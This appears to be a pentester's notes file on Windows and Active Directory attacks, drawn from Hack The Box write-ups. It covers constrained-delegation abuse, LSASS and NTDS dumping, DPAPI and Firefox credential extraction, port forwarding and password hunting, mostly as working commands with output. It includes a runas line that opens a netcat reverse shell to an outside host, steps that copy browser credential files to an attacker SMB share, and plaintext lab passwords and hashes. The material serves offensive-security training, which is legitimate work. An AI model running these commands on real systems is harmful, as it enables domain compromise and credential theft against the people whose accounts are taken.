We are not able to crack this hash, but as seen in above image SVC_INT account has the `AllowedToDelegate` permission on the domain controller!, This means that SVC_INT is allowed to perform Kerberos Constrained Delegation on the target domain controller. Consequently, the SVC_INT account can impersonate any user when accessing any service running on the domain controller. As such, we could abuse this permission to compromise the administrator account which has administrative access on the domain controller.

We will impersonate as Administrator and request TGT.

1. Find the SPN of target DC


## Abuse Constrained Delegation
[More](https://blog.netwrix.com/2023/04/21/attacking-constrained-delegation-to-elevate-access/)

In theory, constrained delegation limits the damage that could result if an AD account is compromised.  But constrained delegation can be abused.

An Attacker who compromises the plaintext password or password hash of an account that is configured with constrained delegation to a service can then he can impersonate any user in the environment to access that service.

To exploit constrained delegation, we need three key things:

1. A compromised account configured with constrained delegation
2. A target privileged account to impersonate when requesting access to the service (ie a domain admin )
3. Information of the machine hosting the service that we will be gaining access to (ie target DC)

**EXAMPLE Scenerio**

Let’s assume the following:

- We have compromised an account with local administrator privileges on a workstation.
- We used Mimikatz to get a password hash left in memory after a logon, and the associated account (the ‘notadmin’ account) has constrained delegation configured.

Thus, all we have so far is access to the one machine we have landed on and the password hash of an account configured for constrained delegation.

How an Attack Unfolds:

1.  First, let’s check the SPN's for which the constrained delegation of the ‘notadmin’ account is configured for. We can also get this information from bloodhound node info.

2. Now once we know that constrained delegation is configured for the X SPN on the Y Domain Controller.

5. Now we can request the ticket granting ticket (TGT) for the account with constrained delegation configured.

6. Now let’s find a good user to impersonate when accessing this service. This can be found from the member of "Domain Admins" group

6. Then execute the (TGS) ticket granting service request for the account we want to impersonate from Domain Admin group. and then access the target service.

7. Now we can use Pass the Ticket to gain access to the X service as one of the domain admin on the Y Domain Controller.

### AllowedToDelegate

**Attack Scenerio**

[More](https://tpetersonkth.github.io/2022/05/14/HTB-Intelligence-Writeup.html)

![alt text](https://0xdfimages.gitlab.io/img/image-20210816144106307.webp)
![alt text](https://0xdfimages.gitlab.io/img/image-20210816144237665.webp)

We have compromised user `Ted.Graves`, Ted.Graves is a member of the ITSUPPORT group which has the ReadGMSAPassword permission on the SVC_INT account. This means that we can read the `SVC_INT` account’s password and thus compromise it

The graph also shows that the SVC_INT account has the `AllowedToDelegate` permission on the domain controller! This means that SVC_INT is allowed to perform Kerberos Constrained Delegation on the target domain controller. Consequently, the SVC_INT account can impersonate any user when accessing any service running on the domain controller. As such, we could abuse this permission to compromise the administrator account which has administrative access on the domain controller.

We already exploited `ReadGMSAPassword` above and got the password now we will Abuse `AllowedToDelegate` permission.

```
1. First lets check the SPN for which the constrained delegation of the 'SVC_INT account is configured for. In this case We can find this information in bloodhound by selecting the SVC_INT node, clicking the Node Info tab and checking the Allowed To Delegate field. By looking at this field, we can discover that the SPN of the domain controller is` WWW/dc.intelligence.htb`.

2. Now that we have the SPN of the domain controller, we need to get a Ticket Granting Ticket (TGT) for SVC_INT  then use that TGT to get (TGS) ie service Ticket for user which we are impersonating ie the `administrator` user  which is part of Domain Admins group. Theoritcally here requesting TGT is called Requesting S4U2self and using that TGT to get TGS for administrator is called Requesting S4U2Proxy. We could attempt to do this `impacket-getST` as demonstrated, Note that hash we got by abusing `ReadGMSAPassword` in this case.

3. The script automatically writes this TGT to a file named “administrator.ccache”. The next step is to use this Service Ticket to log in to the domain controller as the administrator user using Pass the Ticket, we will use `impacket-wmiexec` for that. To ensure that we use the generated TGT for Kerberos authentication, we create an environment variable named “KRB5CCNAME” which points to the administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache file. Then, we run wmiexec with the -k and -no-pass flags, to instruct it to authenticate using Kerberos. We also provide it with the target user and host as the last argument. Upon execution of the wmiexec command, we obtain administrative access to the domain controller, meaning that we have successfully compromised the entire domain!.

```

1. First lets check the SPN for which the constrained delegation of the 'SVC_INT account is configured for.

We can find this information in bloodhound by selecting the SVC_INT node, clicking the Node Info tab and checking the Allowed To Delegate field. By looking at this field, we can discover that the SPN of the domain controller is` WWW/dc.intelligence.htb`.

![alt text](https://tpetersonkth.github.io/assets/2022-05-14-HTB-Intelligence-Writeup/bAllowedToDelegate.png)

2. Now that we have the SPN of the domain controller, we need to get a Ticket Granting Ticket (TGT) for SVC_INT  then use that TGT to get (TGS) ie service Ticket for user which we are impersonating ie the `administrator` user  which is part of Domain Admins group. Theoritcally here requesting TGT is called Requesting S4U2self and using that TGT to get TGS for administrator is called Requesting S4U2Proxy.

We could attempt to do this impacket as demonstrated below, Note that hash we got by abusing `ReadGMSAPassword` in this case.
```
impacket-getST -spn www/dc.intelligence.htb -hashes :b05dfb2636385604c6d36b0ca61e35cb -dc-ip 10.10.10.248 -impersonate administrator intelligence.htb/svc_int
```

In Case you got error - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), we can fix this timestamp issue for kerberos using below command. then run above impacket command again
```
└─$ sudo apt-get install ntpdate
└─$ sudo timedatectl set-ntp 0
└─$ date && sudo ntpdate -s intelligence.htb && date
```
```
└─$ impacket-getST -spn www/dc.intelligence.htb -hashes :b05dfb2636385604c6d36b0ca61e35cb -dc-ip 10.10.10.248 -impersonate administrator intelligence.htb/svc_int
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

3. The script automatically writes this TGT to a file named “administrator.ccache”. The next step is to use this Service Ticket to log in to the domain controller as the administrator user using Pass the Ticket, we will use `impacket-wmiexec` for that.

To ensure that we use the generated TGT for Kerberos authentication, we create an environment variable named “KRB5CCNAME” which points to the administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache file. Then, we run wmiexec with the -k and -no-pass flags, to instruct it to authenticate using Kerberos. We also provide it with the target user and host as the last argument. Upon execution of the wmiexec command, we obtain administrative access to the domain controller, meaning that we have successfully compromised the entire domain!.

```
┌──(kali㉿kali)-[~/CredentialDumping]
└─$ export KRB5CCNAME=administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
                                                    
┌──(kali㉿kali)-[~/CredentialDumping]
└─$ impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb                 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>
```
# CREDENTIAL DUMPING

[More](https://the-pentesting-guide.marmeus.com/situational_awareness/windows/dumping-credentials#local-security-authority-subsystem-service-lsass)
[More](https://attack.mitre.org/techniques/T1003/)

### WINDOWS REGISTRY

SAM

### LAPS 
(Local Administrator Account Paswords)

### LSASS

**Dumping Credentials from LSASS process memory**

`The Local Security Authority Subsystem Service (LSASS)` is a Windows service responsible for enforcing the security policy on the system. It verifies users logging in, handles password changes and creates access tokens. These operations lead to the storage of credential material in the process memory of LSASS. With administrative rights these credentials can be dumped.

We basically dump the memory to a file - LSASS.DMP then extract hash out of it

[More](https://attack.mitre.org/techniques/T1003/001/)
[More](https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass)
[More](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/)
[More](https://en.hackndo.com/remote-lsass-dump-passwords/#manual-method--procdump)

**Tools**
```
# Tools to get the dump ie lsass.dmp

- ProcDump.exe (signed by Microsoft, but need to transfer to target)

- Comsvcs.dll (native library present on all Windows machines)

- Lsassy (tool to remotely dump LSASS)

- Mimikatz (old now, all AV detects it, not recommeded)


# Tools to get hash out of lsass.dmp 

- Mimikatz (on windows)
    .\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

- pypykatz (mimikatz alternative for linux) (pipx install pypykatz or use pip3)
    pypykatz lsa minidump lsass.DMP

```
**Procdump**

The procdump tool is signed by Microsoft, therefore considered legitimate by Windows. Procdump can be used to dump lsass, since it is considered as legitimate thus it will not be considered as a malware.

Its job is to dump a running process memory. It attaches to the process, reads its memory and write it into a file. 
Because of this, it’s possible to dump lsass memory on a host, download its dump locally and then extract the credentials.
Once the memory dump is finished, it can be analyzed with `mimikatz` (Windows) or `pypykatz` (Python, cross-platform).
Recovered credential material could be either plaintext passwords or NT hash that can be used with pass the hash (depending on the context).

This technique is very practical since it does not generate much noise and only legitimate executable is used on the targeted hosts.

You have to copy the Procdump executable to the target machine

[Download](https://live.sysinternals.com/)

1. Find LSASS pid and dump its process memory 
```
# Find lsass's pid
C:\Users\test> tasklist /fi "imagename eq lsass.exe" 
OR
C:\Users\test> tasklist | findstr lsass
OR via PS
PS C:\Users\testadmin> get-process lsass

# Dump lsass's process memory
procdump -accepteula -ma $lsass_pid lsass.dmp

EX - procdump.exe -accepteula -ma 580 out.dmp
```
The dump then needs to be downloaded on the attacker’s host, and traces on the remote host should be erased.


2. remotely Analyse dump on you host using `mimikatz` (Windows) or `pypykatz` (linux)

pypykatz

pipx install pypykatz or use pip3

[Download](https://github.com/skelsec/pypykatz)
```
pypykatz lsa minidump lsass.dmp
```
Mimikatz.exe
```
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```
**Comsvcs**

Our current technique is relying on `Procdump` to dump lsass memory. But eventhough it’s signed by Microsoft, I find it much cleaner to not use it, and use Microsoft built-in tools instead.

There’s a DLL called `comsvcs.dll`, located in C:\Windows\System32 that dumps process memory whenever they crash.

Thanks to this function, we can use `comsvcs.dll` to dump lsass process instead of uploading procdump and executing it. This DLL contains a function called `MiniDumpW` that is written so it can be called with `rundll32.exe`.

```
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\out.dmp full
```
**LSASSY**

Interesting tool that uses a combination of the above methods to remotely dump LSASS. It attempts to use the comsvcs.dll method to dump LSASS via WMI or a remote scheduled task.

[Download](https://github.com/Hackndo/lsassy)
```
└─$ lsassy -d test.lab -u testadmin -p Password123 192.168.0.76
```
Additionally, Lsassy has been integrated into Crackmapexec
```
└─$ crackmapexec smb 192.168.0.76 -u testadmin -p Password123 -M lsassy
```
**Mimikatz**

`Mimikatz` can be used locally to extract credentials with `sekurlsa::logonpasswords`
```
# (Locally) extract credentials from LSASS process memory

sekurlsa::minidump lsass.DMP
log lsass.txt
sekurlsa::logonPasswords
```


### SCHEDULED TASKS

### DcSync

### NTDS
##### Secretsdump.py
```
# This will extract all of the usernames and their NT hashes
# you might need to locate this on kali
# note - system registry hive contains the keys needed to decrypt the NTDS file

python3 secretsdump.py -ntds ntds.nit -system system.hive LOCAL | tee hash_dump.txt

```
```
# Another example of SeBackupPrivilege

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite
*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system
*Evil-WinRM* PS C:\tmp> download ntds.dit
*Evil-WinRM* PS C:\tmp> download system

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL

```
### BROWSER CREDENTIALS


##### FireFox

[More](https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#extract-firefox-passwords)
[More](https://0xdf.gitlab.io/2019/11/30/htb-heist.html#get-creds-from-firefox)

**Where are the creds stored?**

In recent versions of Firefox, there are two relevant artefacts required for decryption of stored credentials.

key4.db and logins.json

C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\key4.db
C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\logins.json

**How are they stored?**

`logins.json` stores all of the user’s logins, including URLs, usernames, passwords and other metadata as JSON. It is worth noting that both the usernames and passwords in these files are 3DES encrypted, then ASN.1 encoded and finally written to the file base64 encoded.

`key4.db` Stores the master key for 3DES decryption of all passwords stored in `logins.json`, along with a “password-check” value that is used to validate decryption of the master key.

**Ways to Dump**

1. procdump64.exe [Download](https://live.sysinternals.com/)
```
Evil-WinRM* PS C:\Users\Chase\Documents> upload ~/exes/procdump64.exe .

*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 6252 -accepteula
```
2. PowerSploit’s Out-Minidump [Download] (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)
```
*Evil-WinRM* PS C:\users\chase\appdata\local\temp>invoke-module ./Out-Minidump.ps1

*Evil-WinRM* PS C:\users\chase\appdata\local\temp> get-process -id 6252 | Out-Minidump

*Evil-WinRM* PS C:\Users\Chase\Documents> download firefox.exe_190823_025430.dmp

# Now I’ll look for any POST requests in memory using grep and the format I found above:

root@kali# grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.exe_190823_025430.dmp 
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=

```
3. [Firepwd.py](https://github.com/lclevy/firepwd)


Luckily for us, Firepwd.py is a tool that recovers passwords from key4.db or logins.json files 

https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/
https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#enumeration-1
https://0xdf.gitlab.io/2022/03/05/htb-hancliffe.html#enumeration-1

1. check if firefox is installed from  C:\program files (x86)
```
*Evil-WinRM* PS C:\program files (x86)> ls

    Directory: C:\program files (x86)

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----        2/25/2022  11:35 PM                IIS
d-----        2/25/2022  11:38 PM                iis express
d-----        3/28/2022   4:46 PM                Internet Explorer
d-----        2/22/2022   1:54 AM                Microsoft SQL Server
d-----        2/22/2022   1:53 AM                Microsoft.NET
d-----        5/26/2022   4:09 PM                Mozilla Firefox
d-----        5/26/2022   4:09 PM                Mozilla Maintenance Service
d-----        2/25/2022  11:33 PM                PHP
d-----        2/22/2022   2:56 AM                Reference Assemblies
d-----        3/28/2022   4:46 PM                Windows Defender
d-----        3/28/2022   4:46 PM                Windows Mail
d-----        3/28/2022   4:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        3/28/2022   4:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                WindowsPowerShell
```
2. Validate the same in the target user's home directory
```
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles> ls

    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                5rwivk2l.default
d-----        2/22/2022   2:42 AM                br53rxeg.default-release

# The first file was found empty, but the second has all the standard files
# To really look through this profile, I’ll want to copy all of files back to my VM. I’ll start a SMB server with Python:
```
3. Copy key4.db and logins.json files found in profiles to your machine using SMB
```
# For modern versions of Windows, I won’t be able to connect without a username and password, and I’ll need SMBv2 support.

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py myshare . -username kali -password kali -smb2support

# I’ll connect to the share from target machine

*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> net use \\10.10.14.6\myshare /u:kali kali

# I need two files from the profile, key4.db and logins.json.

*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.14.6\share\
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.14.6\share\

```
4. Extract password using `Firepwd` - https://github.com/lclevy/firepwd
```
┌──(kali㉿kali)-[~/SMB]
└─$ python3 ~/Downloads/firepwd.py                   
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

5. It finds four saved passwords for Slack. I’ll use crackmapexec to confirm user and password
```
crackmapexec smb 10.10.11.158 -u slack-users -p slack-pass --continue-on-success --no-bruteforce

# No Luck, I’ll try again without --no-bruteforce to try each password with each user.

crackmapexec smb 10.10.11.158 -u slack-users -p slack-pass --continue-on-success 
```
The admin password works for JDgodd (which isn’t surprising since the username is in the password):

SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 





#### Mimikatz

#### 

##### LSASS.DMP

[More](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#extract-hashes)

In This case we have lsass.zip found in SMB share, the first thing comes in mind is mimiktz

# POST EXPLOIT ENUMERATION

### Group Memberships & Privileges

```
# Check User, its group memberships

net user <compromisedUserName>

# Check other users name  - its better to check by going into home dir

dir c:/users

# Check compromised user privileges

whoami /priv

# SID

whoami /user

```
### Hidden Listening Ports

```
netstat -ano | findstr LISTENING
```

**EXAMPLE**

https://0xdf.gitlab.io/2023/05/06/htb-flight.html#shell-as-defaultapppoll

We found a port 8000 on target, which we didnt found initially on our scan, which mean its not directly accessible

```
C:\xampp\htdocs\school.flight.htb\styles>netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5328          
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       676            
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       968
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5328
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       968 
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
...[snip]...
```

Let’s see if we can reach this port locally from the compromised target server

![alt text](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*QKbtiCGwCqJ7C5RuS8XeKg.png)

However its not accessible from our attacker machine lets use `Chisel` to aceess it by `port forwarding`

[Chisel](https://github.com/jpillora/chisel)

```
# Upload Chisel to target

C:\ProgramData>powershell -c wget 10.10.14.6/chisel_1.7.7_windows_amd64.exe -outfile c.exe

# Now I’ll start the server on my VM:

oxdf@hacky$ ./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
2022/10/25 18:43:43 server: Reverse tunnelling enabled
2022/10/25 18:43:43 server: Fingerprint 7FIbTNJUCaqUjVaTZ1TmotCwIr5DhZkAXMfU2qAdxKo=
2022/10/25 18:43:43 server: Listening on http://0.0.0.0:8000

# I’ll connect from Flight, tunneling port 8001 on my host through the tunnel to 8000

C:\ProgramData>.\c client 10.10.14.6:8000 R:8001:127.0.0.1:8000

# Now Visiting http://127.0.0.1:8001 in Firefox returns another site on my acctacker machine

```



## Passwords / Sensitive info

https://juggernaut-sec.com/password-hunting/

#### Files and Contents

```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*
```

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-71.png)

#### Stored Credentials 

Finding stored credentials can be accomplished using one simple command:

```
cmdkey /list
```

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-74.png)

We can exploit this using 2 ways

1. `Runas` command utility
2.  Abusing DPAPI

##### RunAS
Command Execution
```
runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator "cmd.exe /c whoami > C:\temp\whoami.txt"
```

Shell
```
runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator "c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
```
**ATTACK SCENARIO**

https://0xdf.gitlab.io/2019/03/02/htb-access.html#enumeration

##### DPAPI 
https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets
(Data Protection API)

DAAPI is API used for encryption and decryption of sensitive data, this is used by windows built-in applications like `Credential Manager, RDP service etc ` and other third-party windows compatible applications like `Google Chrome, Outlook, Internet Explorer, Skype  etc`.

It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. 

These master keys are usually located at:
```
> C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```
where $SID is the user’s security identifier and the $GUID is the name of the master key. A user can have multiple master keys.

The common paths of hidden files that usually contain DPAPI-protected data / (Credentials blobs) / Credential File is at:
```
> C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\$blob
> C:\users\$User\appdata\local\microsoft\credentials\$blob
```
 This master key needs to be decrypted using the user’s password OR the domain backup key and is then used to decrypt any DPAPI data blobs.

```
1. Grab the Master Key
2. Grab the Credential Blob
3. Move to a Windows host and Fire up mimikatz, and use the dpapi::masterkey command to decrypt the master key using the password from the compromised user with shell
4. Use that master key to decrypt the credential blob
5  We got password for Administrator user

```
**Attack Scenerio**

https://0xdf.gitlab.io/2019/03/02/htb-access.html#privesc-2---dpapi-creds

1.  Find the master key
```
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001

12/11/2018  04:47 PM    <DIR>          .
12/11/2018  04:47 PM    <DIR>          ..
08/22/2018  09:18 PM               468 0792c32e-48a5-4fe3-8b43-d93d64590580
08/22/2018  09:18 PM                24 Preferred
               2 File(s)            492 bytes
               2 Dir(s)  16,764,465,152 bytes free
```
2. Use certutil to base64 encode it and copy it
```
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output 

C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>type output
-----BEGIN CERTIFICATE-----
AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMA
LQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAA
sAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU+/9g
uV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6
DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7
Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOc
wFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAA
D+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1
/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1
Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ
-----END CERTIFICATE-----

C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>del output
```
3. Paste that base64 text into a file on my machine, and decode it:
```
root@kali# cat masterkey.b64 | base64 -d > masterkey
```
4. Do the same thing for the credentials file/blob
```
C:\Users\security\AppData\Roaming\Microsoft\Credentials>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials

08/22/2018  09:18 PM    <DIR>          .
08/22/2018  09:18 PM    <DIR>          ..
08/22/2018  09:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290
               1 File(s)            538 bytes
               2 Dir(s)  16,764,465,152 bytes free

C:\Users\security\AppData\Roaming\Microsoft\Credentials>certutil -encode 51AB168BE4BDB3A603DADE4F8CA81290 output

C:\Users\security\AppData\Roaming\Microsoft\Credentials>type output
```
```
root@kali# cat credentials.b64 | base64 -d > credentials
```

5. Move to a Windows hostfire up mimikatz. I’ll use the dpapi::masterkey command to decrypt the master key using the password from the compromised account (in this case an account name security is compromised)

```
mimikatz # dpapi::masterkey /in:\users\0xdf\desktop\masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
```
6. Use that master key to decrypt the credential file. mimikatz is smart enough to use the master key that is held in memory from previous instruction

```
mimikatz # dpapi::cred /in:\users\0xdf\desktop\credentials
```
7. Now we have Administrator Password

![alt text](https://0xdfimages.gitlab.io/img/access-mimikatz.gif)

#### Registry Keys

We can do a broad search in the registry to find all instances of the string ‘password’ in the HKLM and HKLU registry hives; however, this will create A LOT of results.

Instead, we can focus on targeting known registry keys that contain passwords.

Once such registry key is `winlogon`, which is tied to a setting in Windows called `Autologon`.

##### Autologon / winlogin

We can use below command on cmd or powershell to get it

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-78.png)

#### SAM and SYSTEM Backups

Using the following command, we can search for a copy of this file throughout the entire filesystem

```
cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK
```

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-82.png)

Using icacls, we check the permissions on the backup files and we find that our standard user has Modify permissions. This means we can copy these files to a folder that this user owns and transfer it back to our attacker machine.

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-83.png)

Now that we have exfiltrated a copy of the SYSTEM and SAM file onto our attacker machine, we can easily dump the hashes using secretsdump.py from the Impacket Suite of Tools.

```
secretsdump.py -sam SAM.OLD -system SYSTEM.OLD LOCAL
```

#### IIS Config and Web Files

For an IIS webserver, the webroot is located in the C:\inetpub\wwwroot folder, which is where we will likely find interesting files that contain credentials in them.

In particular, we want to look for the web.config and/or the connectionstrings.config file.

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-56.png)

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/07/image-57.png)

